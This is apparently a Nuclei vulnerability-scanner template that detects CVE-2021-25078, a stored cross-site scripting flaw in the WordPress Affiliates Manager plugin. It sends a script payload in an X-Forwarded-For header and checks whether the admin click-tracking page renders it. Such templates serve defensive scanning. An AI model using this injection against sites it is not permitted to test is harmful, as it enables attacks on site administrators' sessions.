http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200 && status_code_3 == 200
    - contains(header_3, "text/html")
    - contains(body_3, "<img src onerror=alert(document.domain)>")
    - contains(body_3, "Affiliates Manager Click Tracking")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /?wpam_id=1 HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: <img src onerror=alert(document.domain)>

    '
  - 'GET /wp-admin/admin.php?page=wpam-clicktracking HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-25078
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:wpaffiliatemanager:affiliates_manager:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-25078
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.90358
    epss-score: 0.05997
  description: 'The plugin does not validate, sanitise and escape the IP address of
    requests logged by the click tracking feature, allowing unauthenticated attackers
    to perform Cross-Site Scripting attacks against admin viewing the tracked requests.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of an authenticated user, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: affiliates_manager
    vendor: wpaffiliatemanager
    verified: true
  name: Affiliates Manager < 2.9.0 - Cross Site Scripting
  reference:
  - https://wpscan.com/vulnerability/d4edb5f2-aa1b-4e2d-abb4-76c46def6c6e
  - https://nvd.nist.gov/vuln/detail/CVE-2021-25078
  - https://plugins.trac.wordpress.org/changeset/2648196
  - https://github.com/ARPSyndicate/cvemon
  remediation: Fixed in version 2.9.0
  severity: medium
  tags: cve2021,cve,wp,wordpress,authenticated,affiliates-manager,wp-plugin,xss,wpscan,wpaffiliatemanager,vuln
